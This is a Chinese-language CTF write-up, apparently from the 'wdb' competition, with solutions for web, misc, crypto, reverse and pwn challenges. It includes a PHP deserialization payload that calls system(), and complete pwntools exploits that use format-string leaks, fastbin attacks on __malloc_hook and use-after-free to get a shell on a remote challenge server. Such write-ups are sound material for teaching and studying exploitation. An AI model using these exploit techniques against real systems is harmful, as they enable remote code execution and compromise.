wdb
===
[toc]
# WEB
## PHP_WEB
* POST传参，func=hightlight_file  p=index.php，看到源码之后直接反序列化
```php
<?php
class Test { 
    var $p = "ls"; 
    var $func = "system"; 
}
echo serialize(new Test);
```
* POST传参，func=unserialize  p=xxxxxxxxx
* flag在tmp目录下
# MISC
## 签到
* POST /score.php token=xxxxx
## 九宫格
* 根据题目描述就按要求填了一下，得到重要信息为245568
* 压缩包的二维码只分两种，所以写脚本对比下hash即可，一种对应0，一种对应1
* 将其转成字符串，看上去是段密文，最后用Rabbit解密，密码就是上面的重要信息
# CRYPTO
## simple
仿射密码

```python
from string import ascii_lowercase as alphabet
from Crypto.Util.number import *

atoi = lambda a: alphabet.index(a)
itoa = lambda i: alphabet[i]

k1 = 123456 % 26
k2 = 321564 % 26
cipher  = "kgws{m8u8cm65-ue9k-44k5-8361-we225m76eeww}"
for c in cipher:
    if c in alphabet:
        print(itoa( (atoi(c) - k2) * inverse(k1, 26) % 26 // 2 ), end='')
    else:
        print(c, end='')
# flag{c8d8ec65-db9f-44f5-8361-ab225c76bbaa}
```

## RUA

$$
\begin{aligned}
m^e & \equiv c_1 \pmod{n_1}\\
m^e & \equiv c_2 \pmod{n_2}\\
m^e & \equiv c_3 \pmod{n_3}\\
\end{aligned}
$$

得到$m^e \equiv c \pmod{n_1 n_2 n_3}$，发现c的位数为5690，远小于$n_1n_2n_3$的6000+位数。

因此这里的c即为没有被mod过的。

e未知，爆破一下就可以了

```python
c1 = 8024667293310019199660855174436055144348010556139300886990767145319919733369837206849070207955417356957254331839203914525519504562595117422955140319552013305532068903324132309109484106720045613714716627620318471048195232209672212970269569790677144450501305289670783572919282909796765124242287108717189750662740283813981242918671472893126494796140877412502365037187659905034193901633516360208987731322599974612602945866477752340080783296268396044532883548423045471565356810753599618810964317690395898263698123505876052304469769153374038403491084285836952034950978098249299597775306141671935146933958644456499200221696
c2 = 17388575106047489057419896548519877785989670179021521580945768965101106268068805843720622749203590810185213416901978773748832854888898576822477243682874784689127705334243899967896321836688567602323551986980634884700045627950473546069670440078998428940082620044462222475031805594211784370238038168894827559017562364252406425134530719911057780692073760058203345936344269833206906999625580911856011564697811258009937314511410514416706482571471852503756675411177080916350899445106002226392895645443215522671155311715637759618276305217468892076287376401516124640727839779731609203202530346427613422430202271506248285086956
c3 = 5170826942130658374627267470548549396328896108666717036999395626588154882531377393671593939192779292151584678688653835775920356845071292462816417186595460417761844407911946323815187102170021222644920874070699813549492713967666736815947822200867353461264579419205756500926218294604616696969184793377381622818381733352202456524002876336304465082656612634304327627259494264840838687207529676882041997761204004549052900816658341867989593333356630311753611684503882509990853456022056473296726728969894815574884063807804354952314391764618179147583447848871220103094864884798102542377747761263052887894135796051521881179607

n1 = 18856599160001833299560082802925753595735945621023660831294740454109973698430284916320395522883536507135735383517926050963512440162483065097256884040938259092582892259657340825971260278387406398529168309426241530551396056450450728728601248269612166083300938497235910244979946020059799495231539400114422748104072550004260736766137354572252872437140063474603268146956570787143010441293268321641092743010805639953103578977668248726500636191043930770036787317928372179939360510179438436665591755940224156131460271763912868322774604558314812111335691108887319827579162188169744014973478052491398688611046800951698773893393
n2 = 21996468204721630460566169654781925102402634427772676287751800587544894952838038401189546149401344752771866376882226876072201426041697882026653772987648569053238451992877808811034545463363146057879646485465730317977739706776287970278094261290398668538232727000322458605289913900919015380904209692398479885177984131014170652915222062267448446642158394150657058846328033404309210836219241651882903083719822769947131283541299760283547938795574020478852839044803553093825730447126796668238131579735916546235889726257184058908852902241422169929720898025622336508382492878690496154797198800699611812166851455110635853297883
n3 = 22182114562385985868993176463839749402849876738564142471647983947408274900941377521795379832791801082248237432130658027011388009638587979450937703029168222842849801985646044116463703409531938580410511097238939431284352109949200312466658018635489121157805030775386698514705824737070792739967925773549468095396944503293347398507980924747059180705269064441084577177316227162712249300900490014519213102070911105044792363935553422311683947941027846793608299170467483012199132849683112640658915359398437290872795783350944147546342693285520002760411554647284259473777888584007026980376463757296179071968120796742375210877789

m_e = CRT_list([c1,c2,c3], [n1,n2,n3]); m_e

for i in range(3, 10000):
    try:
        root = m_e.nth_root(i)
        print root, i
        break
    except ValueError:
        continue

print hex(int(root))[2:].decode('hex')
# flag{83f4dc02-22ee-44dd-abf2-2fe64f87512f}
```


# RE
### go  [队伍2]
```
import base64
a = 'XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01='
b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
c = 'nRKKAHzMrQzaqQzKpPHClX=='
flag = ''
for i in range(len(c)):
    for j in range(len(a)):
        if c[i] == a[j]:
            flag += b[j]
            break
print flag
print base64.b64decode(flag)
```
求出key
输入即可得flag
flag{e252890b-4f4d-4b85-88df-671dab1d78f3}

### go	[队伍1]
调试发现是base64改了码表
XYZFGHI2+/Jhi345jklmEnopuvwqrABCDKL6789abMNWcdefgstOPQRSTUVxyz01
找到对应码表
替换解密nRKKAHzMrQzaqQzKpPHClX==得到flag
```
please input the key: What_is_go_a_A_H
flag{e252890b-4f4d-4b85-88df-671dab1d78f3}

```

### tree	[队伍2]
i='0111011'
d='0111010'
x='011100'
k='01111'
p='01101'
w='01100'
j='010'
g='0010'
f='0011'
q='00011'
b='00010'
y='0000'
h='1101'
c='11000'
t='110010'
e='110011'  
s='100'
z='1010'
n='1011'
v='1111'
o='11100'
m='111011'
l='1110100'
u='11101010'
r='111010110'
哈夫曼树
直接遍历解出
flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}

### tree	[队伍1]
```
0	unk_406500
1	unk_406518



unk_406518
0	unk_4064D0
1	unk_4064E8


unk_4064E8
0	unk_406470
1	unk_406488

unk_406488
0	unk_4063F8
1	unk_406278		v

unk_4063F8
0	unk_4061D0		o
1	unk_406380

unk_406380
0	unk_406338
1	unk_4061A0		m

unk_406338
0	unk_406188		l
1	unk_406308

unk_406308
0	unk_406260		u
1	unk_4062F0

unk_4062F0
0	unk_406218		r
1	_letters		input




unk_4064D0			'10'
0	unk_406230		s
1	unk_406458

unk_406458
0	unk_4062D8		z
1	unk_4061B8		n

unk_406470			'110'
0	unk_4063E0
1	unk_406128  	h
  
unk_4063E0
0	unk_4060B0		c
1  	unk_406368
  
unk_406368
0	unk_406248		t
1	unk_4060E0		e

unk_406500			'0'
0	unk_4064A0
1	unk_4064B8

unk_4064A0
0	unk_406410
1	unk_406428

unk_406410
0	unk_4062C0		y
1	unk_406398

unk_406398
0	unk_406098		b
1	unk_406200		q


unk_406428		'001'
0	unk_406110		g
1	unk_4060F8		f

unk_4064B8			'01'
0	unk_406158		j
1	unk_406440

unk_406440
0	unk_4063B0
1	unk_4063C8

unk_4063B0
0	unk_406290		w
1	unk_4061E8		p

unk_4063C8			'0111'
0	unk_406350
1	unk_406170		k

unk_406350
0	unk_4062A8		x
1	unk_406320

unk_406320		'011101'
0	unk_4060C8	d
1	unk_406140	i
```
遍历这棵树
zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx
替换
```
a = '10101111101001000001111111001000010101110100111100010010010010000001101010000100100111010111111101110001001000001111100010011100'
flag = ''
temp = ''
for i in range(0,len(a),4):
    flag += str(hex(int(a[i:i+4],2))).replace('0x','')
print flag
```

# PWN
## PWN1    [队伍一]
vim创建堆块 其中vim 2会溢出，cat 2会有fmt，修改到malloc_hook后拿onegadget
远端用rm 2 rm 2测试可以知道是没有tcache的，测试下来是2.23
```python=
from pwn import *
#r=process('./pwn')
r=remote('59.110.243.101',25413)
def gd():
	gdb.attach(r)
	pause()
def s(py):
	r.sendline(py)
libc=ELF('./libc-2.23.so')
s('vim 2')
s('%p')
s('cat 2')
r.recvuntil('0x')
leak=int(r.recv(12),16)
print hex(leak)
llbase=leak-131-libc.symbols['_IO_2_1_stdin_']
print hex(llbase)
s('vim 2')
s('psb')
s('vim 1')
s('psb')
s('rm 1')
s('rm 2')
s('vim 2')
py='a'*0x30+p64(0)+p64(0x71)+p64(llbase+libc.symbols['__malloc_hook']-0x23)
s(py)
s('vim 1')
s('psb')
s('vim 1')
one=llbase+0xf02a4
s('\x00'*3+p64(0)*2+p64(one))
s('vim 2')
r.interactive()
```
## pwn1      [队伍二]
程序自带后门函数，也有fmt漏洞，leak出程序基地址，libc地址
vim2有堆溢出，布置好风水，通过溢出fastbin attack，打到malloc hook，填上后门函数地址，再malloc一次就可。
exp:
```python=
from pwn import *
def add(content,idx):
    p.recvuntil('> ')
    p.sendline('vim '+str(idx))
    p.recvuntil('> ')
    p.sendline(content)
def delete(idx):
    p.recvuntil('> ')
    p.sendline('rm '+str(idx))
def fmt():
    p.recvuntil('> ')
    p.sendline('cat 2')
p = process('./yundun')
p = remote('59.110.243.101',25413)
elf = ELF('./yundun')
add('%35$p%27$p',2)
fmt()
p.recvuntil('> 0x')
libc = int(p.recv(12),16)
libc_base = libc - 0x20830
hook = libc_base + 0x3c4b20 - 0x33
print '[+]libc_base: '+hex(libc_base)
print hex(hook)
p.recv(2)
text = int(p.recv(12),16)
base = text - 0x12ad
pwn = base + 0xcc9
print '[+]base: '+hex(base)
add('a',2)
add('b',1)
delete(1)
delete(2)
add('a'*0x30+p64(0x0)+p64(0x71)+p64(hook),2)
add('a',1)
add('a'*0x13+p64(pwn),1)
#gdb.attach(p)
p.interactive()
```
## pwn3 [队伍一]
野指针调用函数，逻辑洞+uaf，free两次后alloc 0x10后能拿到操作的堆，
```python=
from pwn import *
#r=process('./pwn')
r=remote('59.110.243.101',54621)
libc=ELF('./libc-2.23.so')
def add(size,name):
    r.sendlineafter('choice :','1')
    r.sendlineafter('ic cost ?:',str(size))
    r.sendafter('ame :',name)

def free(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('index :',str(idx))

def use(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('index :',str(idx))

def gd():
    gdb.attach(r)
    pause()
add(0x400,'psb')
add(0x20,'psb')
free(0)
add(0x400,'\xee')
use(2)
leak=u64(r.recv(6).ljust(8,'\x00'))
print hex(leak)
llbase=leak-206-0x10-libc.symbols['__malloc_hook']
print hex(llbase)
sys=llbase+libc.symbols['system']
add(0x20,'psb')
add(0x20,'psb')
free(1)
free(3)
add(0x10,'/bin/sh\x00'+p64(sys))
use(1)
r.interactive()
```
## pwn3 [队伍二]
emmmm，有个函数指针在最开始申请出的0x10的块里，有个UAF漏洞，题目也给了后门，所以申请两个0x20的块，然后free掉，之后再申请一个0x10的块，就能控制其中一个的结构体，在里面填上后门地址，这样再use magic的时候就执行后门函数了
```python=
from pwn import *
def add(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('magic cost ?:')
    p.sendline(str(size))
    p.recvuntil('name :')
    p.sendline(content)
def delete(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('index :')
    p.sendline(str(idx))
def boom(idx):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('index :')
    p.sendline(str(idx))
p = process('./pwn')
p = remote('59.110.243.101',54621)
add(0x20,'aaa')
add(0x20,'aaa')
delete(0)
delete(1)
add(0x10,'yymf!!!!'+p64(0x400a0d))
boom(0)
#gdb.attach(p)
p.interactive()
```
